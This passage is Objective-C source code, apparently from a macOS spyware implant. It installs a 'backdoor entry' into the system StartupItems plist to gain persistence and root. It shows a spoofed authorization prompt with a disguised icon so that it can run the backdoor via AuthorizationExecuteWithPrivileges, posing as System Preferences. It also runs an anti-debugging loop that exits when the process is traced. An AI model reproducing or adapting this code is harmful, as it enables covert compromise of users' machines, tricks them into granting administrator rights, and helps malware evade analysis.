          // ffs overwrite capability anybody @APPLE?
          //
          if ([fileManager removeItemAtPath: [gUtil mSLIPlistPath]
                                      error: &error] == YES)
            {
              if ([fileManager moveItemAtPath: SLIDestination
                                       toPath: [gUtil mSLIPlistPath]
                                        error: &error] == NO)
                {
#ifdef DEBUG_CORE
                  errorLog(@"Error while moving back the modified SLI plist (%s)", error);
#endif
                  
                  return NO;
                }
            }
          else
            {
#ifdef DEBUG_CORE
              errorLog(@"Error while removing the original SLI plist (%s)", error);
#endif
              
              return NO;
            }
        }
      else
        {
          // 
          // Probably here we should backup the SLI and clean it up from our
          // backdoor entry
          //
#ifdef DEBUG_CORE
          infoLog(@"Backdoor is already installed in global SLI");
#endif
        }
    }
  else
    {
      // The SLI plist doesn't exists yet
#ifdef DEBUG_CORE
      infoLog(@"SLI File doesn't exists");
#endif
      
      //
      // Create the SLI plist from scratch
      //
      return [gUtil createSLIPlistWithBackdoor];
    }
  
  return YES;
}

- (void)UISudoWhileAlreadyAuthorized: (BOOL)amIAlreadyAuthorized
{
  AuthorizationRef myAuthorizationRef;
  
  OSStatus myStatus;
  FILE *myCommunicationsPipe  = NULL;
  NSString *execPath          = nil;
  
  //AuthorizationExternalForm extAuth;
  char myReadBuffer[256];
  
  //
  // ExtendRights here is used in order to do the infamous sudo
  //
  AuthorizationFlags myFlags = kAuthorizationFlagDefaults
                                | kAuthorizationFlagInteractionAllowed
                                //| kAuthorizationFlagPreAuthorize
                                | kAuthorizationFlagExtendRights;
  
  //
  // Looks like icns files don't work here .. Only tif(f) atm
  //
  NSString *iconDestinationPath = [[[[[[NSBundle mainBundle] bundlePath]
                                      stringByDeletingLastPathComponent]
                                     stringByDeletingLastPathComponent]
                                    stringByDeletingLastPathComponent]
                                   stringByAppendingPathComponent: @"_sys.tiff"];
  
  NSString *iconCurrentPath = [[[NSBundle mainBundle] bundlePath]
                               stringByAppendingPathComponent: ICON_FILENAME];

  // If we're authorized we can execute now our backdoor properly
  if (amIAlreadyAuthorized == YES)
    {
      NSString *searchPattern = [[NSString alloc] initWithFormat: @"%@/*.ez",
                                 [[NSBundle mainBundle] bundlePath]];
      
      NSArray *_searchedFile = searchForProtoUpload(searchPattern);
      [searchPattern release];
      
      [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
                                                 error: nil];
      
      if ([_searchedFile count] > 0)
        {
          execPath = [[_searchedFile objectAtIndex: 0]
                      stringByReplacingOccurrencesOfString: @".ez"
                      withString: @""];
        }
      else
        {
#ifdef DEBUG_UI_SPOOF
          errorLog(@"ez file not found");
#endif
          exit(-1);
        }    
    }
    
  [[NSFileManager defaultManager] copyItemAtPath: iconCurrentPath
                                          toPath: iconDestinationPath
                                           error: nil];
  
  //
  // Looks like the common practice is to split the AuthorizationItem Rights
  // from the AuthorizationItem Environment since we need to pass 2 different
  // objects later on while calling AuthorizationCopyRights
  //
  AuthorizationItem myItems;
  myItems.name         = kAuthorizationRightExecute; // system.privilege.admin
  myItems.valueLength  = 0;
  myItems.value        = NULL;
  myItems.flags        = 0;
  
  //
  // Authentication Icon
  //
  AuthorizationItem myAuthItems;
  myAuthItems.name          = kAuthorizationEnvironmentIcon;
  myAuthItems.valueLength   = strlen((char *)[iconDestinationPath UTF8String]);
  myAuthItems.value         = (char *)[iconDestinationPath UTF8String];
  myAuthItems.flags         = 0;
  
  AuthorizationRights myRights;
  myRights.count = 1;
  myRights.items = &myItems;
  
  AuthorizationEnvironment authEnvironment;
  authEnvironment.count = 1;
  authEnvironment.items = &myAuthItems;
  
  //
  // Create an empty auth ref to fill later
  //
  myStatus = AuthorizationCreate(&myRights,
                                 //kAuthorizationEmptyEnvironment,
                                 &authEnvironment,
                                 myFlags,
                                 &myAuthorizationRef);
  
  //
  // errAuthorizationSuccess returned in case of success
  //
  if (myStatus != errAuthorizationSuccess)
    {
#ifdef DEBUG_UI_SPOOF
      errorLog(@"[EE] Error while creating the empty Authorization Reference\n");
#endif
      //return myStatus;
    }
  /*
  myStatus = AuthorizationCopyRights(myAuthorizationRef,
                                     &myRights,
                                     //kAuthorizationEmptyEnvironment,
                                     &authEnvironment,
                                     myFlags,
                                     NULL);
  
  if (myStatus != errAuthorizationSuccess)
    {
#ifdef DEBUG_UI_SPOOF
      errorLog(@"[EE] Error while authorizing the user");
#endif
      
      [self _createInternalFilesAndFolders];
      
      //
      // Only perform SLI escalation on 10.5 since it doesn't seem to work
      // on 10.6
      //
      if (gOSMajor == 10 && gOSMinor == 5)
        {
          if ([self getRootThroughSLI] == YES)
            {
#ifdef DEBUG_CORE
              warnLog(@"Err on auth, switching to SLI PLIST mode");
#endif
              [gUtil dropExecFlag];
            }
        }
  
      [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
                                                 error: nil];
      
      exit(-1);
    }*/
  /*  
  //
  // Turn an AuthorizationRef into an external "byte blob" form so it can be
  // passed over the authenticated execution
  //
  myStatus = AuthorizationMakeExternalForm(myAuthorizationRef, &extAuth);
  if (myStatus != errAuthorizationSuccess)
    {
#ifdef DEBUG_UI_SPOOF
      errorLog(@"Unable to turn the AuthorizationRef into external form");
#endif
    }*/
  
  if (execPath == nil)
    {
      if (gOSMajor == 10 && gOSMinor == 5)
        {
          NSString *searchPattern = [[NSString alloc] initWithFormat: @"%@/*.ez",
                                     [[NSBundle mainBundle] bundlePath]];
          
          NSArray *_searchedFile = searchForProtoUpload(searchPattern);
          [searchPattern release];
          
          [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
                                                     error: nil];
          
          if ([_searchedFile count] > 0)
            {
              execPath = [[_searchedFile objectAtIndex: 0]
                          stringByReplacingOccurrencesOfString: @".ez"
                          withString: @""];
            }
          else
            {
#ifdef DEBUG_UI_SPOOF
              errorLog(@"ez file not found");
#endif
              exit(-1);
            }
        }
      else if (gOSMajor == 10 && gOSMinor == 6)
        {
          execPath = [NSString stringWithFormat: @"%@",
                      [[[NSBundle mainBundle] bundlePath]
                       stringByAppendingPathComponent: @"System Preferences"]];
        }
    }
  
  //
  // Do IT Bitch!
  //
  myStatus = AuthorizationExecuteWithPrivileges(myAuthorizationRef,
                                                (char *)[execPath UTF8String],
                                                kAuthorizationFlagDefaults,
                                                nil,
                                                &myCommunicationsPipe);
  
  if (myStatus != errAuthorizationSuccess)
    {
#ifdef DEBUG_UI_SPOOF
      errorLog(@"Error on last step");
#endif
    }
  else
    {
      read(fileno(myCommunicationsPipe), myReadBuffer, sizeof(myReadBuffer));
      fclose(myCommunicationsPipe);
    }
  
  [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
                                             error: nil];
  
  //
  // Free the AuthorizationRef
  //
  AuthorizationFree(myAuthorizationRef, kAuthorizationFlagDestroyRights);
  
  exit(0);
}

//
// See http://developer.apple.com/qa/qa2004/qa1361.html
//
- (void)xfrth
{
  while (true)
    {
      int                 junk;
      int                 mib[4];
      struct kinfo_proc   info;
      size_t              size;
      
      //
      // Initialize the flags so that, if sysctl fails for some bizarre
      // reason, we get a predictable result.
      //
      info.kp_proc.p_flag = 0;
      
      //
      // Initialize mib, which tells sysctl the info we want, in this case
      // we're looking for information about a specific process ID. 
      //
      mib[0] = CTL_KERN;
      mib[1] = KERN_PROC;
      mib[2] = KERN_PROC_PID;
      mib[3] = getpid();
      
      // Call sysctl
      size = sizeof(info);
      junk = sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
      assert(junk == 0);
      
      // We're being debugged if the P_TRACED flag is set
      if ((info.kp_proc.p_flag & P_TRACED) != 0)
        {
          exit(-1);
        }
      
      usleep(50000);
    }
}

@end
